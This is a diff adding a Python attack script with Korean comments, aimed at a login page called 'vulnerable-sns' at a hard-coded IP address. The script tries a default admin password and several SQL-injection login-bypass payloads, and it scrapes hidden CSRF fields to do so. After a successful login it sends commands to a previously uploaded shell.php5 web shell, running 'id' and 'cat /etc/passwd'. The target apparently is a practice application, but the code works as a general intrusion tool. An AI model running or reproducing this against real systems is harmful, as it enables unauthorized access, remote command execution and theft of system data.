@@ -1,0 +1,137 @@
+import requests
+from bs4 import BeautifulSoup
+from urllib.error import URLError
+import time
+
+class AutoLoginScanner:
+    def __init__(self, url, username_field='username', password_field='password'):
+        self.url = url
+        self.username_field = username_field
+        self.password_field = password_field
+        self.session = requests.Session()
+
+    def login(self, username, password, extra_fields=None, headers=None, timeout=10):
+        # 1) 로그인 페이지 GET
+        try:
+            r = self.session.get(self.url, headers=headers, timeout=timeout)
+        except requests.RequestException as e:
+            raise URLError(f"[GET 실패] {e}")
+
+        # 2) 기본 payload 구성
+        payload = {
+            self.username_field: username,
+            self.password_field: password
+        }
+
+        # 3) hidden input 자동 병합 (CSRF 토큰 등)
+        soup = BeautifulSoup(r.text, 'html.parser')
+        for hidden in soup.find_all('input', {'type':'hidden'}):
+            name = hidden.get('name')
+            val  = hidden.get('value','')
+            if name and name not in payload:
+                payload[name] = val
+
+        # 4) 추가 필드 병합
+        if extra_fields:
+            payload.update(extra_fields)
+
+        # 5) 로그인 POST
+        try:
+            resp = self.session.post(self.url,
+                                     data=payload,
+                                     headers=headers,
+                                     timeout=timeout,
+                                     allow_redirects=True)
+        except requests.RequestException as e:
+            raise URLError(f"[POST 실패] {e}")
+
+        # 6) 로그인 성공 여부 판단
+        success = False
+        if resp.history and resp.status_code == 200:
+            success = True
+        # 실패 키워드 감지
+        if "로그인 실패" in resp.text or "Invalid credentials" in resp.text:
+            success = False
+        # 로그아웃 링크가 보이면 성공
+        if "logout" in resp.text.lower() or "sign out" in resp.text.lower():
+            success = True
+
+        # **반드시** 두 값을 리턴해야 unpack 에러가 나지 않습니다
+        return resp, success
+
+# ──────────────────────────────────────────────────
+# 여기에 웹쉘 원격 명령 실행 함수 추가
+def exec_cmd_via_shell(scanner, cmd):
+    """
+    업로드해 둔 shell.php5 웹쉘에 cmd 파라미터로 명령 전달
+    file.php?name=shell.php5&cmd=<cmd>
+    """
+    base = scanner.url.split("/")[0] + "//" + scanner.url.split("/")[2]
+    shell_url = base + "/vulnerable-sns/www/file.php"
+
+    params = {
+        "name": "shell.php5",
+        "cmd": cmd
+    }
+    try:
+        r = scanner.session.get(shell_url, params=params, timeout=5)
+        r.raise_for_status()
+        return r.text.strip()
+    except Exception as e:
+        return f"[ERROR] {e}"
+
+# ──────────────────────────────────────────────────
+def brute_force_login(scanner, headers=None, delay=0.5):
+    PAYLOADS = [
+        ("admin", "1234",           "관리자 기본 비번"),
+        ("admin' OR '1'='1'--", "any", "Classic OR 1=1"),
+        ("admin'--",            "any", "Comment Bypass"),
+        ("' OR 1=1--",          "any", "Empty Username"),
+        ("admin",               "' OR '1'='1", "Password Field"),
+    ]
+
+    for idx, (user, pw, desc) in enumerate(PAYLOADS, 1):
+        print(f"[{idx}/{len(PAYLOADS)}] 시도: {desc}")
+        try:
+            resp, ok = scanner.login(username=user, password=pw, headers=headers)
+        except URLError as e:
+            print("  ▶ 로그인 시도 중 예외:", e)
+            continue
+
+        if ok:
+            print(f"  ▶ 로그인 성공! ({user}/{pw})")
+            print("    세션 쿠키:", scanner.session.cookies.get_dict())
+
+            # 로그인 성공 후 웹쉘로 uid(id) 정보 얻기
+            result_id = exec_cmd_via_shell(scanner, "id")
+            print(">>> [webshell id 결과]")
+            print(result_id)
+
+            # 필요하다면 /etc/passwd 도 확인
+            result_passwd = exec_cmd_via_shell(scanner, "cat /etc/passwd")
+            print(">>> [/etc/passwd]")
+            print(result_passwd)
+
+            return True
+        else:
+            print("  ▶ 로그인 실패")
+
+        time.sleep(delay)
+
+    print("모든 페이로드 시도 완료: 로그인 실패")
+    return False
+
+# ──────────────────────────────────────────────────
+if __name__ == "__main__":
+    LOGIN_URL       = "http://18.179.53.107/vulnerable-sns/www/login.php"
+    USER_FIELD_NAME = "username"
+    PASS_FIELD_NAME = "password"
+    HEADERS = {"User-Agent": "Mozilla/5.0"}
+
+    scanner = AutoLoginScanner(
+        url=LOGIN_URL,
+        username_field=USER_FIELD_NAME,
+        password_field=PASS_FIELD_NAME
+    )
+
+    brute_force_login(scanner, headers=HEADERS, delay=0.3)
